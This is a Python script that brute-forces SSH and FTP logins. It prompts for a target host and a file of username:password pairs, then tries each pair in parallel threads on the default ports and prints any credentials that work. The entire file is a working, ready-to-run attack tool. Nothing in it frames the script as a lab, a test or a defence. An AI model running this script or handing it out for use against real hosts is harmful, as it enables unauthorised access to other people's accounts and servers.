import paramiko
from ftplib import FTP
import sys
import os
import termcolor
import threading
import time

def bruteforce_ssh_and_ftp(host, protocol, credentials_file, ports=None):
    stop_flag = 0
    lock = threading.Lock()
    threads = []

    def ssh_connect(username, password, port):
        nonlocal stop_flag
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(host, port=port, username=username, password=password)
            with lock:
                stop_flag = 1
            print(termcolor.colored(
                f'[+] Found SSH Password: {password}, For Account: {username}, Port: {port}', 'green'))
        except paramiko.AuthenticationException:
            print(termcolor.colored(
                f'[-] Incorrect SSH Login: {username}:{password}, Port: {port}', 'red'))
        except Exception as e:
            print(termcolor.colored(f'[-] SSH Error: {str(e)}, Port: {port}', 'red'))
        finally:
            ssh.close()

    def ftp_bruteforce(username, password, port):
        nonlocal stop_flag
        try:
            ftp = FTP()
            ftp.connect(host, port=port)
            ftp.login(username, password)
            with lock:
                stop_flag = 1
            print(termcolor.colored(
                f'[+] Found FTP Password: {password}, For Account: {username}, Port: {port}', 'green'))
        except Exception as e:
            print(termcolor.colored(f'[-] FTP Error: {str(e)}, Port: {port}', 'red'))
        finally:
            try:
                ftp.quit()
            except:
                pass

    if ports is None:
        # Default ports for SSH and FTP
        if protocol.lower() == 'ssh':
            ports = [22, 23]
        elif protocol.lower() == 'ftp':
            ports = [21]

    if os.path.exists(credentials_file) == False:
        print('[!!] That File/Path Does Not Exist')
        sys.exit(1)

    print(f'* * * Starting Threaded {protocol} Bruteforce On {host} * * *')

    for port in ports:
        threads = []
        with open(credentials_file, 'r') as file:
            for line in file.readlines():
                with lock:
                    if stop_flag == 1:
                        break
                credentials = line.strip().split(':')
                if len(credentials) == 2:
                    username, password = credentials
                    if protocol.lower() == 'ssh':
                        t = threading.Thread(target=ssh_connect, args=(username, password, port))
                    elif protocol.lower() == 'ftp':
                        t = threading.Thread(target=ftp_bruteforce, args=(username, password, port))
                    else:
                        print(f'[-] Unknown protocol: {protocol}')
                        sys.exit(1)
                    threads.append(t)
                    t.start()
                    time.sleep(1)

        # Wait for all threads to complete for this port
        for t in threads:
            t.join()

    if stop_flag == 1:
        exit()

# Example usage
host_input = input('[+] Target Address: ')
protocol_input = input('[+] Protocol (ssh/ftp): ')
credentials_file_input = input('[+] Username:Password File: ')
print('\n')

bruteforce_ssh_and_ftp(host_input, protocol_input, credentials_file_input)
